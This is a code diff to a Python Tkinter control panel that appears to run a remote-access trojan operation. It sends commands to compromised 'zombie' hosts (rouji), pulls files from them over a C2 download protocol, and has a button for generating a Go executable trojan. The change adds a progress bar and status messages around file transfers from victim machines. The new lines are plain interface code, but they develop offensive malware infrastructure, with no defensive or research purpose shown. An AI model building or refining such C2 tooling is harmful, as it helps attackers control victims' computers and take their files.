@@ -2224,6 +2224,7 @@ def rouji_panel():
         rouji_json_xinxi_get = False
         # 发送命令
         client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
+        _transfer_progress_start(f"正在接收文件：{command[4:].strip() or '未知'}")
 
         polling_done = False  # 标志位，用于指示轮询是否完成
 
@@ -2244,6 +2245,7 @@ def rouji_panel():
                         print("文件传输成功")
                     elif "[fail]" in result or "[error]" in result:
                         print("文件传输失败")
+                        _transfer_progress_stop("文件传输失败")
 
                     if result == "[finish]":
                         print("文件接收完成")
@@ -2251,6 +2253,7 @@ def rouji_panel():
                         rouji_json_xinxi_get = True
                         get_rouji_json_xinxi()
                         polling_done = True
+                        _transfer_progress_stop("文件传输完成")
                         return  # 结束轮询
                 # 100ms 后继续检查
                 root.after(100, poll_file_data)
@@ -2260,6 +2263,7 @@ def rouji_panel():
                 rouji_json_xinxi_get = True
                 get_rouji_json_xinxi()
                 polling_done = True  # 出现异常时也将标志设置为 True
+                _transfer_progress_stop("文件传输中断")
 
         # P1-2: 启动 100ms 一次的自主 after 轮询（poll_file_data 内部自续订）。
         # 不再用 `while not polling_done: root.update()` 嵌套事件循环——那会递归处理所有
@@ -2404,6 +2408,25 @@ def rouji_panel():
 
     button5 = Button(nav_frame_two, text="生成Goexe木马", command=add_go_exe_muma)
     button5.grid(row=1, column=8, padx=(10, 10),sticky="w")
+
+    # P5: 文件传输进度条（不确定模式；C2 get 下载协议不带总字节数，
+    # 用动画条 + 底部状态栏文字提示“正在传输”；默认隐藏，下载开始/结束时显隐）
+    transfer_progress = ttk.Progressbar(nav_frame_two, orient="horizontal", mode="indeterminate")
+    transfer_progress.grid(row=2, column=0, columnspan=9, sticky="we", padx=5, pady=(2, 0))
+    transfer_progress.grid_remove()  # 默认隐藏
+
+    def _transfer_progress_start(hint="正在接收文件…"):
+        transfer_progress.grid()
+        transfer_progress.start(12)  # 不确定动画步进间隔（毫秒）
+        set_status(hint)
+
+    def _transfer_progress_stop(hint="就绪 · 破晓·工具箱"):
+        try:
+            transfer_progress.stop()
+        except Exception:
+            pass
+        transfer_progress.grid_remove()
+        set_status(hint)
 
     # ----------------------------------------------------------------------
 
